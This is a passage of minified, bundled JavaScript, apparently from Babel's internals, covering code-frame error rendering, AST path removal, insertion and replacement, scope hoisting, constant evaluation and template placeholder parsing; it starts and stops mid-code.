`);else J+=W;return J}var ZR=!1,MR=/\r\n|[\n\r\u2028\u2029]/;function Yv1(X,Q,J){let Y=Object.assign({column:0,line:-1},X.start),W=Object.assign({},Y,X.end),{linesAbove:G=2,linesBelow:H=3}=J||{},$=Y.line,z=Y.column,U=W.line,K=W.column,B=Math.max($-(G+1),0),q=Math.min(Q.length,U+H);if($===-1)B=0;if(U===-1)q=Q.length;let Z=U-$,M={};if(Z)for(let L=0;L<=Z;L++){let R=L+$;if(!z)M[R]=!0;else if(L===0){let j=Q[R-1].length;M[R]=[z,j-z+1]}else if(L===Z)M[R]=[0,K];else{let j=Q[R-L].length;M[R]=[0,j]}}else if(z===K)if(z)M[$]=[z,0];else M[$]=!0;else M[$]=[z,K-z];return{start:B,end:q,markerLines:M}}function RR(X,Q,J={}){let Y=J.forceColor||sb1()&&J.highlightCode,W=FR(Y),G=X.split(MR),{start:H,end:$,markerLines:z}=Yv1(Q,G,J),U=Q.start&&typeof Q.start.column==="number",K=String($).length,q=(Y?AR(X):X).split(MR,$).slice(H,$).map((Z,M)=>{let L=H+1+M,j=` ${` ${L}`.slice(-K)} |`,F=z[L],A=!z[L+1];if(F){let O="";if(Array.isArray(F)){let w=Z.slice(0,Math.max(F[0]-1,0)).replace(/[^\t]/g," "),N=F[1]||1;if(O=[`
 `,W.gutter(j.replace(/\d/g," "))," ",w,W.marker("^").repeat(N)].join(""),A&&J.message)O+=" "+W.message(J.message)}return[W.marker(">"),W.gutter(j),Z.length>0?` ${Z}`:"",O].join("")}else return` ${W.gutter(j)}${Z.length>0?` ${Z}`:""}`}).join(`
`);if(J.message&&!U)q=`${" ".repeat(K+1)}${J.message}
${q}`;if(Y)return W.reset(q);else return q}function Wv1(X,Q,J,Y={}){if(!ZR){ZR=!0;let G="Passing lineNumber and colNumber is deprecated to @babel/code-frame. Please use `codeFrameColumns`.";if(process.emitWarning)process.emitWarning(G,"DeprecationWarning");else{let H=Error(G);H.name="DeprecationWarning",console.warn(Error(G))}}return J=Math.max(J,0),RR(X,{start:{column:J,line:Q}},Y)}LR.codeFrameColumns=RR;LR.default=Wv1;LR.highlight=AR});var wR=m((DR)=>{Object.defineProperty(DR,"__esModule",{value:!0});DR.hooks=void 0;var lG0=DR.hooks=[function(X,Q){if(X.key==="test"&&(Q.isWhile()||Q.isSwitchCase())||X.key==="declaration"&&Q.isExportDeclaration()||X.key==="body"&&Q.isLabeledStatement()||X.listKey==="declarations"&&Q.isVariableDeclaration()&&Q.node.declarations.length===1||X.key==="expression"&&Q.isExpressionStatement())return Q.remove(),!0},function(X,Q){if(Q.isSequenceExpression()&&Q.node.expressions.length===1)return Q.replaceWith(Q.node.expressions[0]),!0},function(X,Q){if(Q.isBinary()){if(X.key==="left")Q.replaceWith(Q.node.right);else Q.replaceWith(Q.node.left);return!0}},function(X,Q){if(Q.isIfStatement()&&X.key==="consequent"||X.key==="body"&&(Q.isLoop()||Q.isArrowFunctionExpression()))return X.replaceWith({type:"BlockStatement",body:[]}),!0}]});var uY=m((TR)=>{Object.defineProperty(TR,"__esModule",{value:!0});TR._assertUnremoved=ER;TR._callRemovalHooks=PR;TR._markRemoved=xz;TR._remove=SR;TR._removeFromScope=CR;TR.remove=Mv1;var zv1=wR(),Uv1=eX(),Kv1=fz(),IR=E8(),Vv1=$0(),Bv1=cY(),qv1=S6(),{getBindingIdentifiers:Zv1}=Vv1;function Mv1(){var X;if(ER.call(this),qv1.resync.call(this),PR.call(this)){xz.call(this);return}if(!((X=this.opts)!=null&&X.noScope))CR.call(this);this.shareCommentsWithSiblings(),SR.call(this),xz.call(this)}function CR(){let X=Zv1(this.node,!1,!1,!0);Object.keys(X).forEach((Q)=>this.scope.removeBinding(Q))}function PR(){if(this.parentPath){for(let X of zv1.hooks)if(X(this,this.parentPath))return!0}}function SR(){if(Array.isArray(this.container))this.container.splice(this.key,1),Bv1.updateSiblingKeys.call(this,this.key,-1);else Kv1._replaceWith.call(this,null)}function xz(){if(this._traverseFlags|=IR.SHOULD_SKIP|IR.REMOVED,this.parent){var X;(X=(0,Uv1.getCachedPaths)(this))==null||X.delete(this.node)}this.node=null}function ER(){if(this.removed)throw this.buildCodeFrameError("NodePath has been removed so is read-only.")}});var xR=m((bR)=>{Object.defineProperty(bR,"__esModule",{value:!0});bR.default=void 0;var _R=$0(),Dv1=_R,{react:Nv1}=_R,{cloneNode:wv1,jsxExpressionContainer:Iv1,variableDeclaration:Cv1,variableDeclarator:Pv1}=Dv1,Sv1={ReferencedIdentifier(X,Q){if(X.isJSXIdentifier()&&Nv1.isCompatTag(X.node.name)&&!X.parentPath.isJSXMemberExpression())return;if(X.node.name==="this"){let Y=X.scope;do if(Y.path.isFunction()&&!Y.path.isArrowFunctionExpression())break;while(Y=Y.parent);if(Y)Q.breakOnScopePaths.push(Y.path)}let J=X.scope.getBinding(X.node.name);if(!J)return;for(let Y of J.constantViolations)if(Y.scope!==J.path.scope){Q.mutableBinding=!0,X.stop();return}if(J!==Q.scope.getBinding(X.node.name))return;Q.bindings[X.node.name]=J}};class kR{constructor(X,Q){this.breakOnScopePaths=void 0,this.bindings=void 0,this.mutableBinding=void 0,this.scopes=void 0,this.scope=void 0,this.path=void 0,this.attachAfter=void 0,this.breakOnScopePaths=[],this.bindings={},this.mutableBinding=!1,this.scopes=[],this.scope=Q,this.path=X,this.attachAfter=!1}isCompatibleScope(X){for(let Q of Object.keys(this.bindings)){let J=this.bindings[Q];if(!X.bindingIdentifierEquals(Q,J.identifier))return!1}return!0}getCompatibleScopes(){let X=this.path.scope;do{if(this.isCompatibleScope(X))this.scopes.push(X);else break;if(this.breakOnScopePaths.includes(X.path))break}while(X=X.parent)}getAttachmentPath(){let X=this._getAttachmentPath();if(!X)return;let Q=X.scope;if(Q.path===X)Q=X.scope.parent;if(Q.path.isProgram()||Q.path.isFunction())for(let J of Object.keys(this.bindings)){if(!Q.hasOwnBinding(J))continue;let Y=this.bindings[J];if(Y.kind==="param"||Y.path.parentKey==="params")continue;if(this.getAttachmentParentForPath(Y.path).key>=X.key){this.attachAfter=!0,X=Y.path;for(let G of Y.constantViolations)if(this.getAttachmentParentForPath(G).key>X.key)X=G}}return X}_getAttachmentPath(){let Q=this.scopes.pop();if(!Q)return;if(Q.path.isFunction())if(this.hasOwnParamBindings(Q)){if(this.scope===Q)return;let J=Q.path.get("body").get("body");for(let Y=0;Y<J.length;Y++){if(J[Y].node._blockHoist)continue;return J[Y]}}else return this.getNextScopeAttachmentParent();else if(Q.path.isProgram())return this.getNextScopeAttachmentParent()}getNextScopeAttachmentParent(){let X=this.scopes.pop();if(X)return this.getAttachmentParentForPath(X.path)}getAttachmentParentForPath(X){do if(!X.parentPath||Array.isArray(X.container)&&X.isStatement())return X;while(X=X.parentPath)}hasOwnParamBindings(X){for(let Q of Object.keys(this.bindings)){if(!X.hasOwnBinding(Q))continue;let J=this.bindings[Q];if(J.kind==="param"&&J.constant)return!0}return!1}run(){if(this.path.traverse(Sv1,this),this.mutableBinding)return;this.getCompatibleScopes();let X=this.getAttachmentPath();if(!X)return;if(X.getFunctionParent()===this.path.getFunctionParent())return;let Q=X.scope.generateUidIdentifier("ref"),J=Pv1(Q,this.path.node),Y=this.attachAfter?"insertAfter":"insertBefore",[W]=X[Y]([X.isVariableDeclarator()?J:Cv1("var",[J])]),G=this.path.parentPath;if(G.isJSXElement()&&this.path.container===G.node.children)Q=Iv1(Q);return this.path.replaceWith(wv1(Q)),W.isVariableDeclarator()?W.get("init"):W.get("declarations.0.init")}}bR.default=kR});var cY=m((cR)=>{Object.defineProperty(cR,"__esModule",{value:!0});cR._containerInsert=uz;cR._containerInsertAfter=yR;cR._containerInsertBefore=cz;cR._verifyNodeList=YQ;cR.insertAfter=dv1;cR.insertBefore=lv1;cR.pushContainer=rv1;cR.unshiftContainer=iv1;cR.updateSiblingKeys=uR;var Ev1=eX(),mz=E8(),hz=S6(),lY=uY(),Tv1=$0(),_v1=xR(),{arrowFunctionExpression:kv1,assertExpression:bv1,assignmentExpression:vv1,blockStatement:fR,callExpression:xv1,cloneNode:yz,expressionStatement:gz,isAssignmentExpression:fv1,isCallExpression:hv1,isExportNamedDeclaration:hR,isExpression:yv1,isIdentifier:gv1,isSequenceExpression:mv1,isSuper:uv1,thisExpression:cv1}=Tv1;function lv1(X){lY._assertUnremoved.call(this);let Q=YQ.call(this,X),{parentPath:J,parent:Y}=this;if(J.isExpressionStatement()||J.isLabeledStatement()||hR(Y)||J.isExportDefaultDeclaration()&&this.isDeclaration())return J.insertBefore(Q);else if(this.isNodeType("Expression")&&!this.isJSXElement()||J.isForStatement()&&this.key==="init"){if(this.node)Q.push(this.node);return this.replaceExpressionWithStatements(Q)}else if(Array.isArray(this.container))return cz.call(this,Q);else if(this.isStatementOrBlock()){let W=this.node,G=W&&(!this.isExpressionStatement()||W.expression!=null),[H]=this.replaceWith(fR(G?[W]:[]));return H.unshiftContainer("body",Q)}else throw Error("We don't know what to do with this node type. We were previously a Statement but we can't fit in here?")}function uz(X,Q){uR.call(this,X,Q.length);let J=[];this.container.splice(X,0,...Q);for(let G=0;G<Q.length;G++){var Y;let H=X+G,$=this.getSibling(H);if(J.push($),(Y=this.context)!=null&&Y.queue)hz.pushContext.call($,this.context)}let W=hz._getQueueContexts.call(this);for(let G of J){hz.setScope.call(G),G.debug("Inserted.");for(let H of W)H.maybeQueue(G,!0)}return J}function cz(X){return uz.call(this,this.key,X)}function yR(X){return uz.call(this,this.key+1,X)}var gR=(X)=>X[X.length-1];function mR(X){return mv1(X.parent)&&(gR(X.parent.expressions)!==X.node||mR(X.parentPath))}function pv1(X,Q){if(!fv1(X)||!gv1(X.left))return!1;let J=Q.getBlockParent();return J.hasOwnBinding(X.left.name)&&J.getOwnBinding(X.left.name).constantViolations.length<=1}function dv1(X){if(lY._assertUnremoved.call(this),this.isSequenceExpression())return gR(this.get("expressions")).insertAfter(X);let Q=YQ.call(this,X),{parentPath:J,parent:Y}=this;if(J.isExpressionStatement()||J.isLabeledStatement()||hR(Y)||J.isExportDefaultDeclaration()&&this.isDeclaration())return J.insertAfter(Q.map((W)=>{return yv1(W)?gz(W):W}));else if(this.isNodeType("Expression")&&!this.isJSXElement()&&!J.isJSXElement()||J.isForStatement()&&this.key==="init"){let W=this;if(W.node){let G=W.node,{scope:H}=this;if(H.path.isPattern())return bv1(G),W.replaceWith(xv1(kv1([],G),[])),W.get("callee.body").insertAfter(Q),[W];if(mR(W))Q.unshift(G);else if(hv1(G)&&uv1(G.callee))Q.unshift(G),Q.push(cv1());else if(pv1(G,H))Q.unshift(G),Q.push(yz(G.left));else if(H.isPure(G,!0))Q.push(G);else{if(J.isMethod({computed:!0,key:G}))H=H.parent;let $=H.generateDeclaredUidIdentifier();Q.unshift(gz(vv1("=",yz($),G))),Q.push(gz(yz($)))}}return this.replaceExpressionWithStatements(Q)}else if(Array.isArray(this.container))return yR.call(this,Q);else if(this.isStatementOrBlock()){let W=this.node,G=W&&(!this.isExpressionStatement()||W.expression!=null),[H]=this.replaceWith(fR(G?[W]:[]));return H.pushContainer("body",Q)}else throw Error("We don't know what to do with this node type. We were previously a Statement but we can't fit in here?")}function uR(X,Q){if(!this.parent)return;let J=(0,Ev1.getCachedPaths)(this);if(!J)return;for(let[,Y]of J)if(typeof Y.key==="number"&&Y.container===this.container&&Y.key>=X)Y.key+=Q}function YQ(X){if(!X)return[];if(!Array.isArray(X))X=[X];for(let Q=0;Q<X.length;Q++){let J=X[Q],Y;if(!J)Y="has falsy node";else if(typeof J!=="object")Y="contains a non-object node";else if(!J.type)Y="without a type";else if(J instanceof mz.default)Y="has a NodePath when it expected a raw object";if(Y){let W=Array.isArray(J)?"array":typeof J;throw Error(`Node list ${Y} with the index of ${Q} and type of ${W}`)}}return X}function iv1(X,Q){lY._assertUnremoved.call(this);let J=YQ.call(this,Q),Y=this.node[X],W=mz.default.get({parentPath:this,parent:this.node,container:Y,listKey:X,key:0}).setContext(this.context);return cz.call(W,J)}function rv1(X,Q){lY._assertUnremoved.call(this);let J=YQ.call(this,Q),Y=this.node[X];return mz.default.get({parentPath:this,parent:this.node,container:Y,listKey:X,key:Y.length}).setContext(this.context).replaceWithMultiple(J)}cR.hoist=function(Q=this.scope){return new _v1.default(this,Q).run()}});var fz=m((sR)=>{Object.defineProperty(sR,"__esModule",{value:!0});sR._replaceWith=oR;sR.replaceExpressionWithStatements=Tx1;sR.replaceInline=_x1;sR.replaceWith=Ex1;sR.replaceWithMultiple=Px1;sR.replaceWithSourceString=Sx1;var Yx1=vz(),pz=a4(),Wx1=E8(),rR=eX(),dz=cY(),Gx1=tJ(),Hx1=$0(),M5=S6(),{FUNCTION_TYPES:lR,arrowFunctionExpression:$x1,assignmentExpression:nR,awaitExpression:zx1,blockStatement:Ux1,buildUndefinedNode:lz,callExpression:Kx1,cloneNode:iz,conditionalExpression:Vx1,expressionStatement:Bx1,getBindingIdentifiers:qx1,identifier:Zx1,inheritLeadingComments:Mx1,inheritTrailingComments:jx1,inheritsComments:Fx1,isBlockStatement:Ox1,isEmptyStatement:pR,isExpression:aR,isExpressionStatement:Ax1,isIfStatement:Rx1,isProgram:Lx1,isStatement:Dx1,isVariableDeclaration:Nx1,removeComments:wx1,returnStatement:dR,sequenceExpression:Ix1,validate:iR,yieldExpression:Cx1}=Hx1;function Px1(X){var Q;M5.resync.call(this);let J=dz._verifyNodeList.call(this,X);Mx1(J[0],this.node),jx1(J[J.length-1],this.node),(Q=(0,rR.getCachedPaths)(this))==null||Q.delete(this.node),this.node=this.container[this.key]=null;let Y=this.insertAfter(X);if(this.node)this.requeue();else this.remove();return Y}function Sx1(X){M5.resync.call(this);let Q;try{X=`(${X})`,Q=(0,Gx1.parse)(X)}catch(Y){let W=Y.loc;if(W)Y.message+=` - make sure this is an expression.
`+(0,Yx1.codeFrameColumns)(X,{start:{line:W.line,column:W.column+1}}),Y.code="BABEL_REPLACE_SOURCE_ERROR";throw Y}let J=Q.program.body[0].expression;return pz.default.removeProperties(J),this.replaceWith(J)}function Ex1(X){if(M5.resync.call(this),this.removed)throw Error("You can't replace this node, we've already removed it");let Q=X instanceof Wx1.default?X.node:X;if(!Q)throw Error("You passed `path.replaceWith()` a falsy node, use `path.remove()` instead");if(this.node===Q)return[this];if(this.isProgram()&&!Lx1(Q))throw Error("You can only replace a Program root node with another Program node");if(Array.isArray(Q))throw Error("Don't use `path.replaceWith()` with an array of nodes, use `path.replaceWithMultiple()`");if(typeof Q==="string")throw Error("Don't use `path.replaceWith()` with a source string, use `path.replaceWithSourceString()`");let J="";if(this.isNodeType("Statement")&&aR(Q)){if(!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(Q)&&!this.parentPath.isExportDefaultDeclaration())Q=Bx1(Q),J="expression"}if(this.isNodeType("Expression")&&Dx1(Q)){if(!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(Q))return this.replaceExpressionWithStatements([Q])}let Y=this.node;if(Y)Fx1(Q,Y),wx1(Y);return oR.call(this,Q),this.type=Q.type,M5.setScope.call(this),this.requeue(),[J?this.get(J):this]}function oR(X){var Q;if(!this.container)throw ReferenceError("Container is falsy");if(this.inList)iR(this.parent,this.key,[X]);else iR(this.parent,this.key,X);this.debug(`Replace with ${X==null?void 0:X.type}`),(Q=(0,rR.getCachedPaths)(this))==null||Q.set(X,this).delete(this.node),this.node=this.container[this.key]=X}function Tx1(X){M5.resync.call(this);let Q=[],J=pY(X,Q);if(J){for(let q of Q)this.scope.push({id:q});return this.replaceWith(J)[0].get("expressions")}let Y=this.getFunctionParent(),W=Y==null?void 0:Y.node.async,G=Y==null?void 0:Y.node.generator,H=$x1([],Ux1(X));this.replaceWith(Kx1(H,[]));let $=this.get("callee");$.get("body").scope.hoistVariables((q)=>this.scope.push({id:q}));let z=$.getCompletionRecords();for(let q of z){if(!q.isExpressionStatement())continue;let Z=q.findParent((M)=>M.isLoop());if(Z){let M=Z.getData("expressionReplacementReturnUid");if(!M)M=$.scope.generateDeclaredUidIdentifier("ret"),$.get("body").pushContainer("body",dR(iz(M))),Z.setData("expressionReplacementReturnUid",M);else M=Zx1(M.name);q.get("expression").replaceWith(nR("=",iz(M),q.node.expression))}else q.replaceWith(dR(q.node.expression))}$.arrowFunctionToExpression();let U=$,K=W&&pz.default.hasType(this.get("callee.body").node,"AwaitExpression",lR),B=G&&pz.default.hasType(this.get("callee.body").node,"YieldExpression",lR);if(K){if(U.set("async",!0),!B)this.replaceWith(zx1(this.node))}if(B)U.set("generator",!0),this.replaceWith(Cx1(this.node,!0));return U.get("body.body")}function pY(X,Q){let J=[],Y=!0;for(let W of X){if(!pR(W))Y=!1;if(aR(W))J.push(W);else if(Ax1(W))J.push(W.expression);else if(Nx1(W)){if(W.kind!=="var")return;for(let G of W.declarations){let H=qx1(G);for(let $ of Object.keys(H))Q.push(iz(H[$]));if(G.init)J.push(nR("=",G.id,G.init))}Y=!0}else if(Rx1(W)){let G=W.consequent?pY([W.consequent],Q):lz(),H=W.alternate?pY([W.alternate],Q):lz();if(!G||!H)return;J.push(Vx1(W.test,G,H))}else if(Ox1(W)){let G=pY(W.body,Q);if(!G)return;J.push(G)}else if(pR(W)){if(X.indexOf(W)===0)Y=!0}else return}if(Y)J.push(lz());if(J.length===1)return J[0];else return Ix1(J)}function _x1(X){if(M5.resync.call(this),Array.isArray(X))if(Array.isArray(this.container)){X=dz._verifyNodeList.call(this,X);let Q=dz._containerInsertAfter.call(this,X);return this.remove(),Q}else return this.replaceWithMultiple(X);else return this.replaceWith(X)}});var JL=m((QL)=>{Object.defineProperty(QL,"__esModule",{value:!0});QL.evaluate=dx1;QL.evaluateTruthy=lx1;var yx1=["Number","String","Math"],gx1=["isFinite","isNaN","parseFloat","parseInt","decodeURI","decodeURIComponent","encodeURI","encodeURIComponent",null,null],mx1=["random"];function tR(X){return yx1.includes(X)}function ux1(X){return gx1.includes(X)}function cx1(X){return mx1.includes(X)}function lx1(){let X=this.evaluate();if(X.confident)return!!X.value}function E6(X,Q){if(!Q.confident)return;Q.deoptPath=X,Q.confident=!1}var eR=new Map([["undefined",void 0],["Infinity",1/0],["NaN",NaN]]);function E9(X,Q){let{node:J}=X,{seen:Y}=Q;if(Y.has(J)){let W=Y.get(J);if(W.resolved)return W.value;else{E6(X,Q);return}}else{let W={resolved:!1};Y.set(J,W);let G=px1(X,Q);if(Q.confident)W.resolved=!0,W.value=G;return G}}function px1(X,Q){if(!Q.confident)return;if(X.isSequenceExpression()){let Y=X.get("expressions");return E9(Y[Y.length-1],Q)}if(X.isStringLiteral()||X.isNumericLiteral()||X.isBooleanLiteral())return X.node.value;if(X.isNullLiteral())return null;if(X.isTemplateLiteral())return XL(X,X.node.quasis,Q);if(X.isTaggedTemplateExpression()&&X.get("tag").isMemberExpression()){let Y=X.get("tag.object"),{node:{name:W}}=Y,G=X.get("tag.property");if(Y.isIdentifier()&&W==="String"&&!X.scope.getBinding(W)&&G.isIdentifier()&&G.node.name==="raw")return XL(X,X.node.quasi.quasis,Q,!0)}if(X.isConditionalExpression()){let Y=E9(X.get("test"),Q);if(!Q.confident)return;if(Y)return E9(X.get("consequent"),Q);else return E9(X.get("alternate"),Q)}if(X.isExpressionWrapper())return E9(X.get("expression"),Q);if(X.isMemberExpression()&&!X.parentPath.isCallExpression({callee:X.node})){let Y=X.get("property"),W=X.get("object");if(W.isLiteral()){let G=W.node.value,H=typeof G,$=null;if(X.node.computed){if($=E9(Y,Q),!Q.confident)return}else if(Y.isIdentifier())$=Y.node.name;if((H==="number"||H==="string")&&$!=null&&(typeof $==="number"||typeof $==="string"))return G[$]}}if(X.isReferencedIdentifier()){let Y=X.scope.getBinding(X.node.name);if(Y){if(Y.constantViolations.length>0||X.node.start<Y.path.node.end){E6(Y.path,Q);return}let $=Y.path.scope;if(Y.kind==="var"&&$!==Y.scope){let z=!$.path.parentPath.isBlockStatement();for(let U=$.parent;U;U=U.parent){var J;if(U===X.scope){if(z){E6(Y.path,Q);return}break}if((J=U.path.parentPath)!=null&&J.isBlockStatement())z=!0}}if(Y.hasValue)return Y.value}let W=X.node.name;if(eR.has(W)){if(!Y)return eR.get(W);E6(Y.path,Q);return}let G=X.resolve();if(G===X){E6(X,Q);return}let H=E9(G,Q);if(typeof H==="object"&&H!==null&&Y.references>1){E6(G,Q);return}return H}if(X.isUnaryExpression({prefix:!0})){if(X.node.operator==="void")return;let Y=X.get("argument");if(X.node.operator==="typeof"&&(Y.isFunction()||Y.isClass()))return"function";let W=E9(Y,Q);if(!Q.confident)return;switch(X.node.operator){case"!":return!W;case"+":return+W;case"-":return-W;case"~":return~W;case"typeof":return typeof W}}if(X.isArrayExpression()){let Y=[],W=X.get("elements");for(let G of W){let H=G.evaluate();if(H.confident)Y.push(H.value);else{E6(H.deopt,Q);return}}return Y}if(X.isObjectExpression()){let Y={},W=X.get("properties");for(let G of W){if(G.isObjectMethod()||G.isSpreadElement()){E6(G,Q);return}let H=G.get("key"),$;if(G.node.computed){if($=H.evaluate(),!$.confident){E6($.deopt,Q);return}$=$.value}else if(H.isIdentifier())$=H.node.name;else $=H.node.value;let U=G.get("value").evaluate();if(!U.confident){E6(U.deopt,Q);return}U=U.value,Y[$]=U}return Y}if(X.isLogicalExpression()){let Y=Q.confident,W=E9(X.get("left"),Q),G=Q.confident;Q.confident=Y;let H=E9(X.get("right"),Q),$=Q.confident;switch(X.node.operator){case"||":if(Q.confident=G&&(!!W||$),!Q.confident)return;return W||H;case"&&":if(Q.confident=G&&(!W||$),!Q.confident)return;return W&&H;case"??":if(Q.confident=G&&(W!=null||$),!Q.confident)return;return W!=null?W:H}}if(X.isBinaryExpression()){let Y=E9(X.get("left"),Q);if(!Q.confident)return;let W=E9(X.get("right"),Q);if(!Q.confident)return;switch(X.node.operator){case"-":return Y-W;case"+":return Y+W;case"/":return Y/W;case"*":return Y*W;case"%":return Y%W;case"**":return Math.pow(Y,W);case"<":return Y<W;case">":return Y>W;case"<=":return Y<=W;case">=":return Y>=W;case"==":return Y==W;case"!=":return Y!=W;case"===":return Y===W;case"!==":return Y!==W;case"|":return Y|W;case"&":return Y&W;case"^":return Y^W;case"<<":return Y<<W;case">>":return Y>>W;case">>>":return Y>>>W}}if(X.isCallExpression()){let Y=X.get("callee"),W,G;if(Y.isIdentifier()&&!X.scope.getBinding(Y.node.name)&&(tR(Y.node.name)||ux1(Y.node.name)))G=global[Y.node.name];if(Y.isMemberExpression()){let H=Y.get("object"),$=Y.get("property");if(H.isIdentifier()&&$.isIdentifier()&&tR(H.node.name)&&!cx1($.node.name)){W=global[H.node.name];let z=$.node.name;if(hasOwnProperty.call(W,z))G=W[z]}if(H.isLiteral()&&$.isIdentifier()){let z=typeof H.node.value;if(z==="string"||z==="number")W=H.node.value,G=W[$.node.name]}}if(G){let H=X.get("arguments").map(($)=>E9($,Q));if(!Q.confident)return;return G.apply(W,H)}}E6(X,Q)}function XL(X,Q,J,Y=!1){let W="",G=0,H=X.isTemplateLiteral()?X.get("expressions"):X.get("quasi.expressions");for(let $ of Q){if(!J.confident)break;W+=Y?$.value.raw:$.value.cooked;let z=H[G++];if(z)W+=String(E9(z,J))}if(!J.confident)return;return W}function dx1(){let X={confident:!0,deoptPath:null,seen:new Map},Q=E9(this,X);if(!X.confident)Q=void 0;return{confident:X.confident,deopt:X.deoptPath,value:Q}}});var GL=m((YL)=>{Object.defineProperty(YL,"__esModule",{value:!0});YL.statements=YL.statement=YL.smart=YL.program=YL.expression=void 0;var nx1=$0(),{assertExpressionStatement:ax1}=nx1;function rz(X){return{code:(Q)=>`/* @babel/template */;
${Q}`,validate:()=>{},unwrap:(Q)=>{return X(Q.program.body.slice(1))}}}var sG0=YL.smart=rz((X)=>{if(X.length>1)return X;else return X[0]}),tG0=YL.statements=rz((X)=>X),eG0=YL.statement=rz((X)=>{if(X.length===0)throw Error("Found nothing to return.");if(X.length>1)throw Error("Found multiple statements but wanted one");return X[0]}),ox1=YL.expression={code:(X)=>`(
${X}
)`,validate:(X)=>{if(X.program.body.length>1)throw Error("Found multiple statements but wanted one");if(ox1.unwrap(X).start===0)throw Error("Parse result included parens.")},unwrap:({program:X})=>{let[Q]=X.body;return ax1(Q),Q.expression}},XH0=YL.program={code:(X)=>X,validate:()=>{},unwrap:(X)=>X.program}});var dY=m((HL)=>{Object.defineProperty(HL,"__esModule",{value:!0});HL.merge=Yf1;HL.normalizeReplacements=Gf1;HL.validate=Wf1;var Qf1=["placeholderWhitelist","placeholderPattern","preserveComments","syntacticPlaceholders"];function Jf1(X,Q){if(X==null)return{};var J={};for(var Y in X)if({}.hasOwnProperty.call(X,Y)){if(Q.indexOf(Y)!==-1)continue;J[Y]=X[Y]}return J}function Yf1(X,Q){let{placeholderWhitelist:J=X.placeholderWhitelist,placeholderPattern:Y=X.placeholderPattern,preserveComments:W=X.preserveComments,syntacticPlaceholders:G=X.syntacticPlaceholders}=Q;return{parser:Object.assign({},X.parser,Q.parser),placeholderWhitelist:J,placeholderPattern:Y,preserveComments:W,syntacticPlaceholders:G}}function Wf1(X){if(X!=null&&typeof X!=="object")throw Error("Unknown template options.");let Q=X||{},{placeholderWhitelist:J,placeholderPattern:Y,preserveComments:W,syntacticPlaceholders:G}=Q,H=Jf1(Q,Qf1);if(J!=null&&!(J instanceof Set))throw Error("'.placeholderWhitelist' must be a Set, null, or undefined");if(Y!=null&&!(Y instanceof RegExp)&&Y!==!1)throw Error("'.placeholderPattern' must be a RegExp, false, null, or undefined");if(W!=null&&typeof W!=="boolean")throw Error("'.preserveComments' must be a boolean, null, or undefined");if(G!=null&&typeof G!=="boolean")throw Error("'.syntacticPlaceholders' must be a boolean, null, or undefined");if(G===!0&&(J!=null||Y!=null))throw Error("'.placeholderWhitelist' and '.placeholderPattern' aren't compatible with '.syntacticPlaceholders: true'");return{parser:H,placeholderWhitelist:J||void 0,placeholderPattern:Y==null?void 0:Y,preserveComments:W==null?void 0:W,syntacticPlaceholders:G==null?void 0:G}}function Gf1(X){if(Array.isArray(X))return X.reduce((Q,J,Y)=>{return Q["$"+Y]=J,Q},{});else if(typeof X==="object"||X==null)return X||void 0;throw Error("Template replacements must be an array, object, null, or undefined")}});var nz=m((zL)=>{Object.defineProperty(zL,"__esModule",{value:!0});zL.default=Df1;var Uf1=$0(),Kf1=tJ(),Vf1=vz(),{isCallExpression:Bf1,isExpressionStatement:qf1,isFunction:Zf1,isIdentifier:Mf1,isJSXIdentifier:jf1,isNewExpression:Ff1,isPlaceholder:iY,isStatement:Of1,isStringLiteral:$L,removePropertiesDeep:Af1,traverse:Rf1}=Uf1,Lf1=/^[_$A-Z0-9]+$/;function Df1(X,Q,J){let{placeholderWhitelist:Y,placeholderPattern:W,preserveComments:G,syntacticPlaceholders:H}=J,$=If1(Q,J.parser,H);Af1($,{preserveComments:G}),X.validate($);let z={syntactic:{placeholders:[],placeholderNames:new Set},legacy:{placeholders:[],placeholderNames:new Set},placeholderWhitelist:Y,placeholderPattern:W,syntacticPlaceholders:H};return Rf1($,Nf1,z),Object.assign({ast:$},z.syntactic.placeholders.length?z.syntactic:z.legacy)}function Nf1(X,Q,J){var Y;let W,G=J.syntactic.placeholders.length>0;if(iY(X)){if(J.syntacticPlaceholders===!1)throw Error("%%foo%%-style placeholders can't be used when '.syntacticPlaceholders' is false.");W=X.name.name,G=!0}else if(G||J.syntacticPlaceholders)return;else if(Mf1(X)||jf1(X))W=X.name;else if($L(X))W=X.value;else return;if(G&&(J.placeholderPattern!=null||J.placeholderWhitelist!=null))throw Error("'.placeholderWhitelist' and '.placeholderPattern' aren't compatible with '.syntacticPlaceholders: true'");if(!G&&(J.placeholderPattern===!1||!(J.placeholderPattern||Lf1).test(W))&&!((Y=J.placeholderWhitelist)!=null&&Y.has(W)))return;Q=Q.slice();let{node:H,key:$}=Q[Q.length-1],z;if($L(X)||iY(X,{expectedNode:"StringLiteral"}))z="string";else if(Ff1(H)&&$==="arguments"||Bf1(H)&&$==="arguments"||Zf1(H)&&$==="params")z="param";else if(qf1(H)&&!iY(X))z="statement",Q=Q.slice(0,-1);else if(Of1(X)&&iY(X))z="statement";else z="other";let{placeholders:U,placeholderNames:K}=!G?J.legacy:J.syntactic;U.push({name:W,type:z,resolve:(B)=>wf1(B,Q),isDuplicate:K.has(W)}),K.add(W)}function wf1(X,Q){let J=X;for(let G=0;G<Q.length-1;G++){let{key:H,index:$}=Q[G];if($===void 0)J=J[H];else J=J[H][$]}let{key:Y,index:W}=Q[Q.length-1];return{parent:J,key:Y,index:W}}function If1(X,Q,J){let Y=(Q.plugins||[]).slice();if(J!==!1)Y.push("placeholders");Q=Object.assign({allowAwaitOutsideFunction:!0,allowReturnOutsideFunction:!0,allowNewTargetOutsideFunction:!0,allowSuperOutsideMethod:!0,allowYieldOutsideFunction:!0,sourceType:"module"},Q,{plugins:Y});try{return(0,Kf1.parse)(X,Q)}catch(W){let G=W.loc;if(G)W.message+=`
`+(0,Vf1.codeFrameColumns)(X,{start:G}),W.code="BABEL_TEMPLATE_PARSE_ERROR";throw W}}});var sz=m((VL)=>{Object.defineProperty(VL,"__esModule",{value:!0});VL.default=kf1;var Pf1=$0(),{blockStatement:Sf1,cloneNode:oz,emptyStatement:Ef1,expressionStatement:az,identifier:rY,isStatement:UL,isStringLiteral:Tf1,stringLiteral:_f1,validate:KL}=Pf1;function kf1(X,Q){let J=oz(X.ast);if(Q)X.placeholders.forEach((Y)=>{if(!hasOwnProperty.call(Q,Y.name)){let W=Y.name;throw Error(`Error: No substitution given for "${W}". If this is not meant to be a
            placeholder you may want to consider passing one of the following options to @babel/template:
